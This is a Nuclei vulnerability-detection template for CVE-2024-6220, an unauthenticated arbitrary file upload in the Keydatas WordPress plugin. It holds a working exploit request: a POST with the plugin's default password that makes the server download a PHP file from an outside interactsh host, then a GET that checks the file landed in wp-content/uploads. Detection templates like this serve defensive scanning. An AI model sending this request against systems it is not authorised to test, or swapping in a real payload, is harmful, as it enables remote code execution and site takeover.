id: CVE-2024-6220

info:
  name: WordPress Keydatas ≤ 2.5.2 – Unauthenticated Arbitrary File Upload
  author: hnd3884
  severity: critical
  description: |
    The Keydatas plugin for WordPress (known in Chinese as "简数采集器") is vulnerable to unrestricted file uploads due to missing file-type validation in the keydatas_downloadImages function in all versions up to and including 2.5.2. An unauthenticated attacker can upload arbitrary files to the server — potentially leading to remote code execution, site takeover, or other severe compromise.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2024-6220
    - https://www.wordfence.com/threat-intel/vulnerabilities/wordpress-plugins/keydatas/keydatas-252-unauthenticated-arbitrary-file-upload
    - https://github.com/advisories/GHSA-29rm-j4cx-hmc5
  classification:
    cve-id: CVE-2024-6220
    cwe-id: CWE-434
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cpe: cpe:2.3:a:keydatas:keydatas:*:*:*:*:*:wordpress:*:*
  metadata:
    verified: true
    vendor: keydatas
    product: Keydatas (WordPress plugin)
  tags: cve, cve2024, wordpress, keydatas, arbitrary-file-upload, unauthenticated, rce

flow: http(1) && http(2)

http:
  - raw:
      - |
        POST /?__kds_flag=post HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        kds_password=keydatas.com&post_title=1&__kds_docImgs=http://{{interactsh-url}}/poc.php&__kds_download_imgs_flag=true
    matchers:
      - type: dsl
        dsl:
          - "status_code == 200"
          - 'contains(body, "{\"rs\":1")'
        condition: and
        internal: true

    extractors:
      - type: regex
        part: http_1_request
        name: folder
        regex:
          - "http://([0-9a-zA-Z\\.]+?)/poc.php"
        internal: true
        group: 1

  - method: GET
    path:
      - "{{BaseURL}}/wp-content/uploads/{{folder}}/poc.php"

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "<body>[0-9a-z]+?</body>" # interactsh response format
        part: body

      - type: status
        status:
          - 200

    extractors:
      - type: dsl
        dsl:
          - "BaseURL + '/wp-content/uploads/' + folder + '/poc.php'" # Extract file path
